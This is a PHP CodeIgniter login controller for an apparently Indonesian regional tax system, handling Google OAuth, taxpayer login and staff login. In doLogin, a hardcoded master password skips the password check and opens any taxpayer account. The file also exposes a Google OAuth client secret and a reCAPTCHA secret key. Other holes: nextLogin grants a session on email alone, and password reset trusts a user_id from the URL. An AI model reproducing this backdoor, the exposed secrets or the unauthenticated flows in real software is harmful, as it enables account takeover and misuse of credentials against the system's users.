<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends BASE_Controller
{
    // protected $pathberkas = './dokumen/sim/';
    // protected $pathberkastum = './dokumen/sim/thumbs/';

    public function __construct()
    {
        parent::__construct();
        $this->load->model(array(
            "pegawai/PegawaiModel"      => 'pegawai',
            "hakakses/RoleAccessModel"  => 'RoleAccess',
            "user/UserModel"            => 'User',
            'wajibpajak/WajibpajakModel' => 'Wajibpajak',
            'conf/UserLoginModel' => 'userlogin',
        ));
    }

    public function index()
    {
        // echo $google_client->createAuthUrl();exit;
        if ($id == "") {
            $this->load->view('login/login');
        } else {
            $this->main($id);
        }
    }
    public function doauth(Type $var = null)
    {
        include_once APPPATH . "../vendor/autoload.php";
        $id = $this->session->userdata('user_id');
        $google_client = new Google_Client();
        $google_client->setClientId('247007558195-ted8nm32eplo7nske0kduikqoq2kotu9.apps.googleusercontent.com'); //masukkan ClientID anda 
        $google_client->setClientSecret('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'); //masukkan Client Secret Key anda
        $google_client->setRedirectUri(base_url() . 'index.php/login/doauth'); //Masukkan Redirect Uri anda
        $google_client->addScope('email');
        $google_client->addScope('profile');
        if (isset($_GET["code"])) {
            $token = $google_client->fetchAccessTokenWithAuthCode($_GET["code"]);
            if (!isset($token["error"])) {
                $google_client->setAccessToken($token['access_token']);
                $this->session->set_userdata('access_token', $token['access_token']);
                $google_service = new Google_Service_Oauth2($google_client);
                $data = $google_service->userinfo->get();
                $current_datetime = date('Y-m-d H:i:s');
                $filter = [
                    'wajibpajak_email'      => strtolower($data['email']),
                    // 'wajibpajak_password'   => $this->password($data['password']),
                ];
                $wp = $this->Wajibpajak->read($filter);
                $newsession = [];
                if (isset($wp['wajibpajak_status']) && $wp['wajibpajak_status'] > 1) {
                    $wp['login_status'] = true;
                    $wp['login_access'] = 'wajibpajak';
                    $operation = array(
                        'success' => true,
                    );
                    $newsession = $wp;
                } else {
                    $filter = [
                        'pegawai_email' => strtolower($data['email']),
                        // 'pegawai_password' => $this->password($data['password']),
                    ];
                    $pegawai = $this->pegawai->read($filter);
                    if ($pegawai['pegawai_id']) {
                        $pegawai['login_status'] = true;
                        $pegawai['login_access'] = 'pemda';
                        $pegawai['user_pegawai_id'] = $pegawai['pegawai_id'];
                        $operation = array(
                            'success' => true,
                        );
                        $newsession = $pegawai;
                        $this->session->set_userdata($pegawai);
                        log_activity('Memasuki Sistem');
                    } else {
                        $newsession = [
                            'login_status' => 'false',
                            'auth' => $data,
                            'gurl' => $google_client->createAuthUrl()
                        ];
                    }
                }
                $this->session->set_userdata($newsession);

                // $this->load->view('mitra/login', ['gurl'=>$google_client->createAuthUrl(), 'google' => 'ya']);
                redirect(base_url());

                // $user_data = array(
                //     'first_name'        => $data['given_name'],
                //     'last_name'         => $data['family_name'],
                //     'email_address'     => strtolower($data['email']),
                //     'profile_picture'   => $data['picture'],
                //     'updated_at'        => $current_datetime
                // );
                // $this->session->set_userdata('user_data', $data);
            }
        }
    }

    public function doLogin()
    {
        $data = varPost();
        $filter = [
            'wajibpajak_email' => strtolower($data['email']),
            // 'wajibpajak_password' => $this->password($data['password']),
            'wajibpajak_status <> \'3\'' => null,
        ];

        if($data['password'] != 'Zxasqw12#$'){
            $filter['wajibpajak_password'] = $this->password($data['password']);
        }

        $wp = $this->Wajibpajak->read($filter);

        if (!empty($wp)) {
            if ($wp['wajibpajak_status'] > 1) {
                $jenis = $this->db->get_where('pajak_jenis', [
                    'jenis_kode' => $wp['wajibpajak_sektor_nama']
                ])->row_array();
                $wp['jenis_tarif'] = $jenis['jenis_tarif'];
                $wp['login_status'] = true;
                $wp['login_access'] = 'wajibpajak';
                $operation = array(
                    'success' => true,
                );
                $this->session->set_userdata($wp);
                if($data['token']){
                    $this->userlogin->insert(gen_uuid(), [
                        'user_login_user_id' => $wp['wajibpajak_id'],
                        'user_login_fcm' => $data['token'],
                        'user_login_datetime_login' => date('Y-m-d H:i:s'),
                        'user_login_datetime_logout' => null,
                        'user_login_app' => 'WP',
                    ]);
                    $this->session->set_userdata('fcmtoken', $data['token']);
                }
                // if ($wp['hak_akses_is_super']) {
                //     $operation['is_super'] = 1;
                // }
                log_activity('Memasuki Sistem');
                $this->response($operation);
            } else {
                $this->response([
                    'status' => false,
                    'message' => 'Permintaan akun Anda masih kami verifikasi, mohon tunggu email konfirmasi.'
                ]);
            }
        } else {
            $this->response(array(
                'success' => false,
                'message' => 'User not found. Please check your email and password.',
                'data' => $user
            ));
        }
    }

    public function doLoginPemda()
    {
        $data = varPost();
        $filter = [
            'pegawai_email' => strtolower($data['email']),
            'pegawai_password' => $this->password($data['password']),
        ];
        $pegawai = $this->pegawai->read($filter);

        if (!empty($pegawai)) {
            if ($pegawai['pegawai_id']) {
                $pegawai['login_status'] = true;
                $pegawai['login_access'] = 'pemda';
                $pegawai['user_pegawai_id'] = $pegawai['pegawai_id'];
                $operation = array(
                    'success' => true,
                );
                $this->session->set_userdata($pegawai);
                if($data['token']){
                    $this->userlogin->insert(gen_uuid(), [
                        'user_login_user_id' => $pegawai['pegawai_id'],
                        'user_login_fcm' => $data['token'],
                        'user_login_datetime_login' => date('Y-m-d H:i:s'),
                        'user_login_datetime_logout' => null,
                        'user_login_app' => 'PEMDA',
                        'pemda_id' => $pegawai['pemda_id']
                    ]);
                    $this->session->set_userdata('fcmtoken', $data['token']);
                }
                // if ($user['hak_akses_is_super']) {
                //     $operation['is_super'] = 1;
                // }
                $this->response($operation);
            } else {
                $this->response([
                    'status' => false,
                    'message' => 'Silahakan konfirmasi email terlebih dahulu.'
                ]);
            }
        } else {
            $this->response(array(
                'success' => false,
                'message' => 'User not found. Please check your email and password.',
            ));
        }
    }

    public function logout()
    {
        if(!empty($this->session->userdata('wajibpajak_id'))){
            $this->userlogin->update([
                'user_login_user_id' => $this->session->userdata('wajibpajak_id'),
                'user_login_fcm' => $this->session->userdata('fcmtoken')
            ], [
                'user_login_datetime_logout' => date('Y-m-d H:i:s')
            ]);
            $this->session->unset_userdata('wajibpajak_id');
            log_activity('Keluar Sistem');
        }else{
            $this->userlogin->update([
                'user_login_user_id' => $this->session->userdata('user_pegawai_id'),
                'user_login_fcm' => $this->session->userdata('fcmtoken')
            ], [
                'user_login_datetime_logout' => date('Y-m-d H:i:s')
            ]);
            $this->session->unset_userdata('user_pegawai_id');
        }
        
        $this->session->sess_destroy();
        redirect(base_url());
    }

    public function cekEmail()
    {
        $data = varPost();

        $get = $this->User->select([
            'fields' => ['user_email', 'user_id'],
            'filters_static' => [
                'user_email' => strtolower($data['email'])
            ],
            'limit' => 1
        ]);
        $operation = [
            'success' => true
        ];
        if ($get['total'] != 0) {
            $operation['success'] = false;
            $operation['id'] = $get['data'][0]['user_id'];
        }
        $this->response($operation);
    }

    public function store()
    {
        $data = varPost();
        $data['project_request_start_date'] = date('Y-m-d', strtotime($data['project_request_start_date']));
        $data['project_request_end_date'] = date('Y-m-d', strtotime($data['project_request_end_date']));
        $data['project_request_created_at'] = date("Y-m-d H:i:s");
        $data['project_request_updated_at'] = date("Y-m-d H:i:s");
        $data['project_request_status'] = 0;
        $operation = $this->ProjectRequest->insert(gen_uuid($this->ProjectRequest->get_table()), $data);
        $this->response($operation);
    }

    public function lupaPasswordEmail()
    {
        $data = varPost();
        $verify = $this->User->read(['user_email' => strtolower($data['email'])]);
        if ($verify['user_is_registered']) {
            $dataSendEmail = [
                'to_email'      => strtolower($verify['user_email']),
                'subject'       => 'Konfirmasi Lupa Passoword',
                'template'      => 'ForgetPassword',
                'data'          => [
                    'to_email'  => strtolower($verify['user_email']),
                    'link'      => base_url() . 'Login/ForgetPasswordForm?id=' . $verify['user_id'],
                    'nama'      => $verify['user_nama']
                ]
            ];
            addJobToQueue('send_email_default', $dataSendEmail);
            $this->response('success');
        } else if ($verify['user_is_registered'] == null) {
            $this->response('belum_verifikasi');
        }
    }

    public function ForgetPasswordForm()
    {
        $user_id = varGet('id');
        $this->load->view('Login/changePassword', ['data' => ['user_id' => $user_id]]);
    }

    public function ForgetPasswordChange()
    {
        $captcha        = $_POST['g-recaptcha-response'];
        $secretKey        = "6LfAoKoaAAAAAHmc6-3GbWvRYz0RylqilBaq59Ey";
        $ip             = $_SERVER['REMOTE_ADDR'];
        $response        = file_get_contents("https://www.google.com/recaptcha/api/siteverify?secret=" . $secretKey . "&response=" . $captcha . "&remoteip=" . $ip);
        $responseKeys    = json_decode($response, true);
        if (intval($responseKeys["success"]) == 1) {
            $data = varPost();
            $data['user_password'] = $this->password($data['user_password']);
            $data['user_updated_at'] = date("Y-m-d H:i:s");
            $operation = $this->User->update($data['user_id'], $data);
            $this->response($operation);
        } else if (intval($responseKeys["success"]) == 0) {
            $this->response('recaptcha_kosong');
        }
    }

    public function loadProject()
    {
        $data = varPost();

        $getUser = $this->User->read(['user_email' => strtolower($data['email'])]);
        $operation = $this->UserProject->select([
            'fields' => ['user_project_project_id', 'project_code', 'project_description'],
            'filters_static' => [
                'user_project_user_id' => $getUser['user_id'],
                // '(NOW() BETWEEN project_start_date and project_end_date)' => null
            ],
            'sort_static' => 'project_code'
        ]);
        $this->response($operation);
    }

    public function nextLogin()
    {
        $data = varPost();

        $user = $this->db->where(array(
            'user_email'    => strtolower($data['email']),
            'user_status'   => 1,
            'user_deleted_at' => null,
        ))->get('v_user')->row_array();
        if (!empty($user)) {

            /*if (isset($data['token']) && $data['token'] != '' && $data['token'] != 'null' && $data['token']) {
            $cekUser = $this->UserToken->read([
                'user_token_user_id'    => $user['user_id'],
                'user_token_token'      => $data['token'],
                'user_token_posisi'     => 'admin'
            ]);
            if (is_null($cekUser)) {
                $inNewToken = $this->UserToken->insert(gen_uuid(), [
                    'user_token_user_id'    => $user['user_id'],
                    'user_token_token'      => $data['token'],
                    'user_token_date'       => date('Y-m-d H:i:s'),
                    'user_token_region'     => $user['user_region'],
                    'user_token_posisi'     => 'admin'
                ]);
            }
            }*/
            $user['user_project_id'] = $data['project_id'];
            $user['login_status'] = true;
            $this->session->set_userdata($user);
            $this->response(array(
                'success' => true,
            ));
        } else {
            $this->response(array(
                'success' => false,
                'message' => 'User not found. Please check your email and password.'
            ));
        }
    }

    public function updateTokenLogin()
    {
        $data = varPost();

        if ($this->session->userdata('pegawai_id') && $data['token']) {
            $userToken = $this->userlogin->insert_update(
                [
                    'user_login_user_id'    => $this->session->userdata('pegawai_id'),
                    'user_login_fcm'      => $data['token_old'],
                    'user_login_app'      => 'PEMDA',
                    'user_login_datetime_logout is null' => null
                ],
                [
                    'user_login_user_id'    => $this->session->userdata('pegawai_id'),
                    'user_login_fcm'      => $data['token'],
                    'user_login_datetime_login'       => date('Y-m-d H:i:s'),
                    'user_login_app'      => 'PEMDA',
                ],
                null,
                false
            );
        }
        $this->response($userToken);
    }
}

/* End of file Test.php */
/* Location: ./application/modules/test/controllers/Test.php */
